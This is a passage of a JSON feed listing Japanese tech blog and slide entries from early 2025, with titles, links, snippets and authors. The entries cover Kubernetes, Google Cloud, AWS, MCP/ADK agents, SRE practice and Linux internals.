を定義しましたが、検索結果をcontextとして、LLMへの問い合わせを行なってください。次回、5月の回（日程未定）で解説します。","isoDate":"2025-04-28T09:56:21.000Z","dateMiliSeconds":1745834181000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AWS Load Balancer Controller (LBC)でkubernetesのServiceを外部に公開する","link":"https://zenn.dev/kamos/articles/65c7d16bf16184","contentSnippet":"はじめにAWS LBC(Load Balancer Controller)は、EKS上のリソースとしてALBを構成するための機能です。今回はこの機能の基本的な使い方や、より高度な構成について説明します。 AWS LBCとはなにかAWS LBC(Load Balancer Controller)は、Kubernetesのリソースを監視し、AWS Elastic Load Balancerをそれにあわせて管理するコンポーネントです。AWS LBCが監視する対象は、EKS内のIngressリソースとService Type LoadBalancerリソースです。これらのKubern...","isoDate":"2025-04-28T05:52:13.000Z","dateMiliSeconds":1745819533000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Testkubeとは？KubernetesクラスタにおけるE2Eテストの統合","link":"https://sreake.com/blog/testkube-e2e-test-on-kubernetes-cluster/","contentSnippet":"Sreake事業部の荒木です。KubernetesやSRE、LLM領域の関連技術など幅広い領域にわたって調査・検証を行っています。 今回、kubernetesクラスタのE2Eテストを統合、管理することができるTestku […]The post Testkubeとは？KubernetesクラスタにおけるE2Eテストの統合 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-25T12:27:40.000Z","dateMiliSeconds":1745584060000,"authorName":"Sreake","authorId":"Sreake"},{"title":"OpenFeature を使ったアプリケーション開発","link":"https://sreake.com/blog/openfeature-feature-flag-management/","contentSnippet":"はじめに はじめましての方も、そうじゃない方も、こんにちはこんばんは。Sreake 事業部 佐藤慧太(@SatohJohn)です。 皆さん、アプリケーションのコードを変更せずに機能の有効無効を切り替えることができる Fe […]The post OpenFeature を使ったアプリケーション開発 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-23T09:40:01.000Z","dateMiliSeconds":1745401201000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ここはMCPの夜明けまえ","link":"https://speakerdeck.com/nwiizo/kokohamcpnoye-ming-kemae","contentSnippet":"本日、「AI駆動開発実践の手引き -これが僕/私のAI（アイ）棒」というイベントで「ここはMCPの夜明けまえ」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 【ハイブリッド開催】AI駆動開発実践の手引き -これが僕/私のAI（アイ）棒-\\r- 公式URL: https://hack-at-delta.connpass.com/event/350588/\\r\\r\uD83D\uDCDD 登壇ブログ\\r- 2025年4月、AIとクラウドネイティブの交差点で語った2日間の記録 #CNDS2025 #hack_at_delta\\r- https://syu-m-5151.hatenablog.com/entry/2025/04/24/113500","isoDate":"2025-04-23T04:00:00.000Z","dateMiliSeconds":1745380800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Dockerを使用せずにイメージを作成し実行してみる - go-containerregistryによる実装","link":"https://qiita.com/m_pig/items/82643135254b5b326e61","contentSnippet":"このページではコンテナイメージがどのように作成されているのかを、go-containerregistryライブラリを使った実装例を通して解説します。Dockerfileを使わずに、プログラムからコンテナイメージを作成する過程を見ていきます。コードの全体像createT...","isoDate":"2025-04-23T02:38:27.000Z","dateMiliSeconds":1745375907000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"EKS Pod Identityを利用してセキュアにkubernetesリソースからAWSリソースにアクセスする","link":"https://zenn.dev/kamos/articles/873ecca3f9bab0","contentSnippet":"はじめにAWS EKS (Elastic Kubernetes Service) を利用している場合、Kubernetes上のリソースだけで完結させることはほぼなく、多くの場合、kubernetesの世界にないAWSリソースにアクセスする必要があります。例えば、S3バケットへのファイルのアップロード、DynamoDBのテーブルへのデータの読み書き、SQSキューへのメッセージの送受信など、様々なユースケースが考えられます。その際に使用するのがPod Identityです。https://docs.aws.amazon.com/ja_jp/eks/latest/userguide/p...","isoDate":"2025-04-22T09:37:59.000Z","dateMiliSeconds":1745314679000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"生成AIによるCloud Native基盤構築の可能性と実践的ガードレールの敷設について","link":"https://speakerdeck.com/nwiizo/sheng-cheng-ainiyorucloud-native-ji-pan-gou-zhu-noke-neng-xing-toshi-jian-de-gadorerunofu-she-nituite","contentSnippet":"こんにちは皆さん！本日はCloud Native Daysのプレイベントで登壇させていただきます。2019年以来の登壇となりますが、当時はまだ肩こりなんて無縁だったんですよね…。\\r\\r時の流れは容赦ないもので、最近の肩こりが辛くて昨日も整骨院に通ってきました。30分の持ち時間に対してスライドが80枚以上という暴挙にも出ています。\\r\\r---\\r\\r本日、「CloudNative Days Summer 2025 プレイベント」というイベントで「生成AIによるCloud Native 基盤構築の可能性と実践的ガードレールの敷設について」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: CloudNative Days Summer 2025 プレイベント\\r- 公式URL:https://cloudnativedays.connpass.com/event/351211/ \\r- イベントのURL: https://event.cloudnativedays.jp/cnds2025\\r\\r\uD83D\uDCDD 登壇ブログ\\r- 2025年4月、AIとクラウドネイティブの交差点で語った2日間の記録 #CNDS2025 #hack_at_delta\\r- https://syu-m-5151.hatenablog.com/entry/2025/04/24/113500","isoDate":"2025-04-22T04:00:00.000Z","dateMiliSeconds":1745294400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"クラウド開発環境Cloud Workstationsの紹介","link":"https://speakerdeck.com/yunosukey/kuraudokai-fa-huan-jing-cloud-workstationsnoshao-jie","contentSnippet":"","isoDate":"2025-04-22T04:00:00.000Z","dateMiliSeconds":1745294400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Lookerの独自言語「LookML」とは","link":"https://sreake.com/blog/what-is-lookml/","contentSnippet":"はじめに 2023年10月にGoogleが提供するBIツール「Looker」が政府認定クラウドサービス(通称 ISMAP) に認定されてから、早1年と半年程が経ちました。 もしかすると、「Lookerを導入してみた」「ま […]The post Lookerの独自言語「LookML」とは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-22T03:29:39.000Z","dateMiliSeconds":1745292579000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Intel SDMをRAG化してMCP経由でClineに使わせる","link":"https://dev.mix64.com/2025/04/17/rag-mcp-cline/","contentSnippet":"今回はIntel SDMをはじめとした数千枚のPDF仕様書をRAGとして作成し、それをMCP経由でClineに使わせることでAIエージェント...","isoDate":"2025-04-17T07:24:48.000Z","dateMiliSeconds":1744874688000,"authorName":"ayibote","authorId":"ayibote"},{"title":"Google Cloud Next 2025 データベースRecap ~データベース関連の全41リリースを紹介~","link":"https://sreake.com/blog/google-cloud-next-2025-database-updates/","contentSnippet":"AgentspaceやAgent Development Kit、A2A Protocolの発表など生成AI関連の発表が目立ったGoogle Cloud Next 2025ですが、データベース関連でも魅力的なリリースがた […]The post Google Cloud Next 2025 データベースRecap ~データベース関連の全41リリースを紹介~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-17T03:04:19.000Z","dateMiliSeconds":1744859059000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理","link":"https://sreake.com/blog/account-management-by-google-cloud-privileged-access-manager/","contentSnippet":"はじめに Google Cloud Privileged Access Manager (PAM)は、Google Cloud における特権アクセス管理のためのフルマネージドサービスです。2024年5月にプレビュー版が提 […]The post Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-15T09:00:04.000Z","dateMiliSeconds":1744707604000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ディレクトリ構成の基本原則","link":"https://sreake.com/blog/directory-structure-good-practice/","contentSnippet":"こんにちは。スリーシェイクの中原です。 プロジェクトが大きくなるにつれて「メンテナンスがしづらい」「開発スピードが遅い」と悩みを抱える要因の一つに「ディレクトリ構造がイケてない」があると考えています。 本日は、そういった […]The post ディレクトリ構成の基本原則 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-14T03:44:43.000Z","dateMiliSeconds":1744602283000,"authorName":"Sreake","authorId":"Sreake"},{"title":"genai-toolbox を実装して mcp server として公開し ADK から使ってみる","link":"https://zenn.dev/satohjohn/articles/dbf4afed585680","contentSnippet":"mcp server を作ってみるということで、genai-toolbox という物があるのでそれを元にやっていきますhttps://github.com/googleapis/genai-toolboxこちらは、各 DB への接続情報と、どういう SQL を実行するかを yaml、または、http の baseurl と request parameter などで記載することで tool を作成することができます。接続先は図にもある形になると思います。https://github.com/googleapis/genai-toolbox/raw/main/docs/en/get...","isoDate":"2025-04-13T01:54:27.000Z","dateMiliSeconds":1744509267000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"既存の mcp を ADK 経由で叩いてみる。 playwright を使う。","link":"https://zenn.dev/satohjohn/articles/68bdde2842e8b4","contentSnippet":"mcp の client に付いて詳しくなりたいと思いつつ adk についてもやりたいのでチョット調べてみます。今回は playwright の mcp に繋いでみようと思います。https://mcp.so/server/playwright-mcp/microsoft?tab=contentplaywright は別サーバで立てるような想定で考えておきます。そのためドキュメントにある通り以下のように記載します$ npx @playwright/mcp@latest --port 8931Listening on http://localhost:8931Put this...","isoDate":"2025-04-12T10:12:09.000Z","dateMiliSeconds":1744452729000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK で作った agent を mcp server で公開する","link":"https://zenn.dev/satohjohn/articles/48a82ff7de531b","contentSnippet":"ほぼ前回の続きhttps://zenn.dev/satohjohn/articles/b23bd65c289257A2A を調べてたんですがその前に mcp 何も知らんということで実装しながら手で覚えていきます。前回使っていた code_agent (sequential_agent) を公開できるようにします。ADK の agent を作ったら、それを mcp server として公開ができる AgentTool というものがあるので、それを使います。https://google.github.io/adk-docs/tools/function-tools/#3-agent...","isoDate":"2025-04-11T16:21:06.000Z","dateMiliSeconds":1744388466000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK + Cloud Run を動かす","link":"https://zenn.dev/satohjohn/articles/b23bd65c289257","contentSnippet":"Google Cloud Next \'25 に参加してます。そのうち会社のほうで参加レポートを出します。こちらは ADK(Agent Development Kit、Android ではない) のメモ書きのようなものです2025/04/11 時点だと python でしか ADK はリリースされていないようです。 Cloud Run で動かすCloud Run で動かす方法自体は https://google.github.io/adk-docs/deploy/cloud-run/ に記載されていますのでほぼこちらを参考にお願いします。ディレクトリやファイルは以下のとおりで...","isoDate":"2025-04-11T08:02:18.000Z","dateMiliSeconds":1744358538000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Geminiとリアルタイム音声会話できるWebアプリの作り方","link":"https://sreake.com/blog/gemini-realtime-voice-chat-app/","contentSnippet":"はじめに 現在、生成AIを利用したアプリケーションが増加しています。その多くはテキストを中心としたものですが、アプリケーションによっては音声や動画でのやり取りが必要となることもあります。これまで生成AIとの音声・動画のや […]The post Geminiとリアルタイム音声会話できるWebアプリの作り方 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-08T06:04:03.000Z","dateMiliSeconds":1744092243000,"authorName":"Sreake","authorId":"Sreake"},{"title":"n8n on Cloud Run （ツール比較から選定まで）","link":"https://zenn.dev/meziron/articles/bff3ac566f8b93","contentSnippet":"はじめにこんにちは！日々の業務や個人開発で、繰り返し行う作業や複数のサービス間でのデータ連携に「もっと楽にならないかな？」と感じることはありませんか？私もその一人で、ワークフロー自動化ツールの導入を検討し始めました。世の中にはZapierやIFTTTといったSaaS型の有名なツールがありますが、今回はオープンソースでセルフホストも可能な選択肢を中心に比較検討しました。この記事では、まず私がなぜ n8n を選んだのか、その理由を説明します。そして後半では、選定したn8nを Terraform を使用して Cloud Run 上に構築した際の具体的な手順や構成について解説します。...","isoDate":"2025-04-08T04:53:10.000Z","dateMiliSeconds":1744087990000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド","link":"https://zenn.dev/meziron/articles/a95d3133a1c385","contentSnippet":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド（ハマりどころ解説付き） はじめに (きっかけ)「このプロジェクト、最初は Prisma 使ってたけど、マイグレーションまでは管理してなかったんだよな...」「開発も進んで、そろそろちゃんとスキーマ変更を管理したいけど、_prisma_migrations テーブルがない...」そんな状況、ありませんか？ 私もまさにその状況に直面しました。Prisma は導入済みでデータベーススキーマも存在しているけれど、Prisma Migrate によるマイグレーション管理は行われていない。運用が始まってい...","isoDate":"2025-04-07T05:34:46.000Z","dateMiliSeconds":1744004086000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"【スリーシェイク】入社エントリ\uD83E\uDD73 \uD83C\uDF89","link":"https://zenn.dev/meziron/articles/9d727354b70ecd","contentSnippet":"こんにちは！こんばんは！スリーシェイクにフルスタックエンジニアとして入社して2ヶ月が経ちました、あびまる（釘宮）です。この2ヶ月間、スリーシェイクのカルチャー、メンバーの意識の高さ、そして温かい雰囲気に触れ、非常に充実した日々を送っています。今回は、私が実際に体験したスリーシェイクの魅力について、すこしだけ語らせてください！\uD83D\uDE47 会社のカルチャーへの感動まず、会社のカルチャーに深く感銘を受けました。CEO自らが技術発信の重要性を説き、社会のtoil（無駄な作業）をなくすために全力を尽くす姿勢は、非常に刺激的です。✨また、社長との定期的なミーティングでは、プロダクトやサービスの新機...","isoDate":"2025-04-03T14:01:57.000Z","dateMiliSeconds":1743688917000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"GTC2025 参加記録　~Keynote~","link":"https://sreake.com/blog/gtc2025-keynote/","contentSnippet":"3-shakeのsreake事業部でフルスタックエンジニアとして、主にML周りを担当している赤川です。今回は、サンフランシスコのサンノゼで3/17~3/21に開催されたGTC2025において、NVIDIA CEOのJen […]The post GTC2025 参加記録　~Keynote~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-31T00:26:08.000Z","dateMiliSeconds":1743380768000,"authorName":"Sreake","authorId":"Sreake"},{"title":"gopass を使ってパスワード共有を試す","link":"https://blog.1q77.com/2025/03/share-password-using-gopass/","contentSnippet":"gopass とはPostgres Weekly を眺めていて Creating Postgres Roles with Passwords Stored in Gopass という記事で gopass というものの存在を知りました。名前から分かるように Go 言語で書かれており、マルチプラットフォームのパスワード管理用コマンドラインツールです。GPG を使って暗号化し、Git で管理します。GPG の公開鍵暗号を使って複数人で複合することが可能になっており、任意の人とパスワードを共有することが可能です。","isoDate":"2025-03-29T00:57:32.000Z","dateMiliSeconds":1743209852000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"nvidia/cuda imageを使ってDockerコンテナでGPUを使用する","link":"https://sreake.com/blog/gpu-used-docker-with-nvidia-cuda-image/","contentSnippet":"はじめに Sreake事業部アプリケーション開発チームの角谷です！ 最近、機械学習やディープラーニング、特に生成AIの分野で、GPUの活用がますます重要になってきています。 Stable DiffusionやChatGP […]The post nvidia/cuda imageを使ってDockerコンテナでGPUを使用する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-27T04:33:27.000Z","dateMiliSeconds":1743050007000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【調査】curl の CVE-2023-38545 について","link":"https://dev.mix64.com/2025/03/25/cve-2023-38545/","contentSnippet":"過去最悪の脆弱性と自称したことで話題になった curl の CVE-2023-38545 について、ソースコードベースでどういう挙動をしてい...","isoDate":"2025-03-25T14:57:59.000Z","dateMiliSeconds":1742914679000,"authorName":"ayibote","authorId":"ayibote"},{"title":"Kubernetesで実現できるPlatform Engineering の現在地","link":"https://speakerdeck.com/nwiizo/kubernetesdeshi-xian-dekiruplatform-engineering-noxian-zai-di","contentSnippet":"本日、「Kubernetesで実践する Platform Engineering - FL#88」というイベントで「Kubernetesで実現できるPlatform Engineering の現在地」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: Kubernetesで実践する Platform Engineering - FL#88\\r- 公式URL: https://forkwell.connpass.com/event/348104/\\r\\r\uD83D\uDDE3️ 関連スライド\\r- インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて\\r- https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite\\r- Platform Engineeringは自由のめまい\\r- https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","isoDate":"2025-03-25T04:00:00.000Z","dateMiliSeconds":1742875200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"論文紹介 ”A Survey on Large Language Model based Autonomous Agents”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-a-survey-on-large-language-model-based-autonomous-agents","contentSnippet":"https://genai-users.connpass.com/event/349197/\\r\\rこの論文は大規模言語モデル（LLM）を基盤とする自律型エージェントに関する包括的な調査論文です。この論文は、LLMベースの自律型エージェントの現状、構成要素、課題、そして将来の展望について詳細に解説しています。\\r\\r本論文を読むことで、AIエージェントの概要を体系的に知ることができます。","isoDate":"2025-03-24T04:00:00.000Z","dateMiliSeconds":1742788800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"SLI/SLO・ラプソディあるいは組織への適用の旅","link":"https://speakerdeck.com/nwiizo/slorapusodeiaruihazu-zhi-henoshi-yong-nolu","contentSnippet":"こんにちは、花粉症が辛いです。登壇する時にくしゃみしないために朝から外出を自粛してます。15分なのにスライドが40枚あります。\\r\\r\\r本日、「信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～」というイベントで「SLI/SLO・ラプソディあるいは組織への適用の旅」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～\\r- 公式URL: https://findy.connpass.com/event/345990/\\r\\r\uD83D\uDCDA さらに！4日後の3月25日には翻訳した書籍に関する登壇する別イベントもあります！\uD83D\uDE32\\r「Kubernetesで実践する Platform Engineering - FL#88」\uD83D\uDC33⚙️\\r興味がある方はぜひ参加してください！\uD83D\uDC68‍\uD83D\uDCBB\uD83D\uDC69‍\uD83D\uDCBB\\r\uD83D\uDC49 https://forkwell.connpass.com/event/348104/\\r\\rお見逃しなく！\uD83D\uDDD3️✨","isoDate":"2025-03-20T04:00:00.000Z","dateMiliSeconds":1742443200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【解説】Linux 6.12で高速化されたVirtioVsockについて","link":"https://dev.mix64.com/2025/03/16/virtio-vsock/","contentSnippet":"今回はLinux 6.12で高速化された VirtioVsock について、どのような改善が行われたのかLinuxのソースコードベース解説し...","isoDate":"2025-03-16T13:06:55.000Z","dateMiliSeconds":1742130415000,"authorName":"ayibote","authorId":"ayibote"},{"title":"外向けに話すときは相手のメリットを話そう","link":"https://nnaka2992.hatenablog.com/entry/2025/03/14/204148","contentSnippet":"お仕事をしているとチームや自分の周りで合意を取ったことを、相手にお願いしに行くことが多々あります。例えばピープルマネジメントのマネージャー層でxxというやり方を試していきたいと合意をとったものを、相手にお願いしに行くこと。例えば自分たちの担当範囲の決め事で、相手に協力をお願いしに行くこと。例えば自分たちのシステムと他システム間の決め事で、こちらの方針を相談しに行くこと。自分たちの決め事を相手に協力してもらうことはよくあります。方針を固めるまでにディスカッションを重ね、自分たちにどのようなメリットがあるかは詳細に話すでしょう。自分たちの考えやメリットも詳細に説明できるでしょう。では相手のメリットはどうでしょう？ 自分の考えやメリットの説明で終わってはいないでしょうか？相手のアクションが必要なとき、ポジションティブに動いてもらうには相手の動機が重要です。相手にメリット考えて貰うより、発案者から提案したほうが心象も良くなります。要は相手の立場を考えましょうの一側面です。相手と話すときは相手の立場を考えましょう。","isoDate":"2025-03-14T11:41:48.000Z","dateMiliSeconds":1741952508000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ObservabilityCON on the Road Tokyo 2025 Recap","link":"https://sreake.com/blog/observabilitycon-on-the-road-tokyo-2025-recap/","contentSnippet":"はじめに Sreake事業部の岩﨑です。 2025年2月25日、ObservabilityCON on the Road Tokyo 2025 が東京ポートシティ竹芝で開催されました。初めての参加でしたが、Grafana […]The post ObservabilityCON on the Road Tokyo 2025 Recap first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-14T02:09:01.000Z","dateMiliSeconds":1741918141000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google CloudのTerraform職人が失職する機能が出てしまった……","link":"https://zenn.dev/nnaka2992/articles/intro_to_application_design_center","contentSnippet":"Google CloudがApplication Design Centerという、構成図を書けばTerraformを書いて、デプロイまで行う機能をリリースしました。[1]https://cloud.google.com/application-design-center/docs/overviewどうやらGoogle CloudはTerraform職人を失職に追い込みたいようです。 Application Design Centerの概要アプリケーション デザイン センターは、Google Cloud アプリケーション インフラストラクチャの設計、共有、デプロイに役立ちます...","isoDate":"2025-03-11T00:30:01.000Z","dateMiliSeconds":1741653001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"フロントエンドオブザーバビリティ on Google Cloud","link":"https://speakerdeck.com/yunosukey/hurontoendoobuzababiritei-on-google-cloud","contentSnippet":"","isoDate":"2025-03-07T05:00:00.000Z","dateMiliSeconds":1741323600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【解説】Linux 6.14で導入されるUncached Buffered I/O について","link":"https://dev.mix64.com/2025/03/06/uncached-bufferd-io/","contentSnippet":"今回は Linux 6.14で導入される Uncached Buffered I/O について解説します。従来のBuffered I/OとD...","isoDate":"2025-03-06T14:29:56.000Z","dateMiliSeconds":1741271396000,"authorName":"ayibote","authorId":"ayibote"},{"title":"StageCrewとは？マルチモーダルAIツールを触ってみた","link":"https://sreake.com/blog/research-multi-modal-tool-stagecrew/","contentSnippet":"StageCrew™️とは StageCrew™（https://stagecrew.ai/）は、システム監視やログ収集、トランザクションのトレースといった各種管理ツールに対するアクセスを自動化、インシデント発生時の対応 […]The post StageCrewとは？マルチモーダルAIツールを触ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-06T11:13:20.000Z","dateMiliSeconds":1741259600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"LookMLって定数を定義できるの?","link":"https://zenn.dev/nedoko_dok0dko/articles/6d6bacc1a294b9","contentSnippet":"whatLookMLで定数を定義する事ができるのか調べてみた個人ログ Q.LookMLって定数を定義できるの?A. できるLookMLも他のプログラミング言語と同じように定数を設定できる。 定数の定義とマニフェストファイル マニフェストファイルLookMLにおいて、定数はマニフェストファイルというファイルを作成することによって定義する事ができる。https://cloud.google.com/looker/docs/lookml-project-files?hl=ja#project_manifest_filesマニフェストファイルは、定数の定義以外にも...","isoDate":"2025-03-06T10:53:04.000Z","dateMiliSeconds":1741258384000,"authorName":"seno","authorId":"seno"},{"title":"KotlinでAndroidアプリを作ってみる（超初級編）","link":"https://qiita.com/masaru-komiyama/items/8231c0e69d9fb54909aa","contentSnippet":"インフラ屋でもクソアプリを作りたくなる夜があるじゃない！と、言うことで本日は手元のMac端末でKotlinを触ってみようと思います。超初級編なので、あまり深い記事は期待しないでください。とりあえず環境整えて、動かしてみよう！　と気軽に取り掛かるきっかけとなることを重視...","isoDate":"2025-03-03T13:22:04.000Z","dateMiliSeconds":1741008124000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"技術的負債と立ち向かう前に知っておいてもいいこと","link":"https://sreake.com/blog/think-about-technical-debt/","contentSnippet":"はじめに こんにちは、nwiizoです。開発チームの会話の中で「これは技術的負債だから後で対処しよう」という言葉をよく耳にします。納期に追われるプロジェクトでは、この「後で」が永遠の「いつか」になりがちです。結果として多 […]The post 技術的負債と立ち向かう前に知っておいてもいいこと first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T10:46:12.000Z","dateMiliSeconds":1740998772000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる","link":"https://sreake.com/blog/step-up-product-backlog-and-user-story-development/","contentSnippet":"Sreake事業部アプリケーション開発チームの安本です。 現在、スクラムでアプリケーション開発の概念検証（Proof of Concept; PoC）を進めています。 本記事では、スクラム開発を行っているチーム向けに、私 […]The post ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T01:17:49.000Z","dateMiliSeconds":1740964669000,"authorName":"Sreake","authorId":"Sreake"},{"title":"くちあだきみあむはしきぎ","link":"https://qiita.com/masaru-komiyama/items/0160cf23fbe2576f869c","contentSnippet":"おい！タイトルバグってんぞ！　と思われた皆様。安心してください。バグっておりません。電気回路を嗜んだ方なら、何かあったときについ口ずさんでしまう復活の呪文（まぁ色んな意味で記憶を呼び起こす呪文なので嘘は言っていない）...　じゃなくて、カラーコードの覚え方について簡単に書...","isoDate":"2025-03-02T12:57:49.000Z","dateMiliSeconds":1740920269000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"[2025/02/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20250228","contentSnippet":"#kubenewsの2025年02月28日の回で話す、@bells17が最近気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。この記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://www.youtube.com/live/e4qQt7sQ46Y 告知とかニュースっぽいもの コードを読んで理解するko buildhttps...","isoDate":"2025-02-28T10:19:14.000Z","dateMiliSeconds":1740737954000,"authorName":"bells17","authorId":"bells17"},{"title":"AIエージェント元年@日本生成AIユーザ会","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian-at-ri-ben-sheng-cheng-aiyuzahui","contentSnippet":"https://genai-users.connpass.com/event/344332/\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-28T05:00:00.000Z","dateMiliSeconds":1740718800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud Model Armorによるプロンプトインジェクション対策","link":"https://sreake.com/blog/prompt-injection-protection-with-google-cloud-model-armor/","contentSnippet":"はじめに 昨年2024年は生成AIアプリケーションの開発が本格化し、RAG（Retrieval-Augmented Generation）が爆発的に流行した年でした。今年2025年はAIエージェントの年になると考えられて […]The post Google Cloud Model Armorによるプロンプトインジェクション対策 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-27T02:14:57.000Z","dateMiliSeconds":1740622497000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AI時代におけるMLOpsのTips","link":"https://speakerdeck.com/shukob/aishi-dai-niokerumlopsnotips","contentSnippet":"https://event.ospn.jp/osc2025-spring/session/2017030\\rAI時代におけるMLOpsのTips 〜 MLOpsを加速させるOSS 〜\\rオープンソースカンファレンス2025 Tokyo/Spring\\rライトニングトークにてKubeflowの紹介などMLOpsの話をさせていただきました。","isoDate":"2025-02-22T05:00:00.000Z","dateMiliSeconds":1740200400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェント元年","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian","contentSnippet":"https://genai-users.connpass.com/event/344292/\\r\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"コンテナサプライチェーンセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasapuraitiensekiyuritei","contentSnippet":"イベント登壇資料です。2025/02/21 #CNCJ\\rhttps://cncj-security.connpass.com/event/341812/","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"OpenClarityの裏側を知りたい","link":"https://speakerdeck.com/kojake_300/openclaritynoli-ce-wozhi-ritai-fe15f317-ff7b-4f9e-acd4-8d389e3ebed8","contentSnippet":"","isoDate":"2025-02-20T05:00:00.000Z","dateMiliSeconds":1740027600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"コードを読んで理解するko build","link":"https://speakerdeck.com/bells17/kotowodu-nteli-jie-suruko-build","contentSnippet":"Jagu\'e\'r Cloud Native #17 ハイブリッド Meetup ~ 推しの CNCF プロジェクトを紹介するぜ LT ~ の登壇資料です。\\rhttps://jaguer-cloud-native.connpass.com/event/342024/\\r\\r参考リンク・画像など引用元一覧\\rhttps://ko.build/ \\rhttps://github.com/ko-build/ko \\rhttps://github.com/google/go-containerregistry \\rhttps://github.com/sigstore/cosign \\rhttps://github.com/opencontainers/image-spec \\rhttps://github.com/cncf/sandbox/issues/17 \\rhttps://github.com/ko-build/ko/issues/791 \\rhttps://github.com/cncf/sandbox/issues/163 \\rhttps://github.com/cncf/artwork/blob/main/projects/ko/stacked/color/ko-stacked-color.png 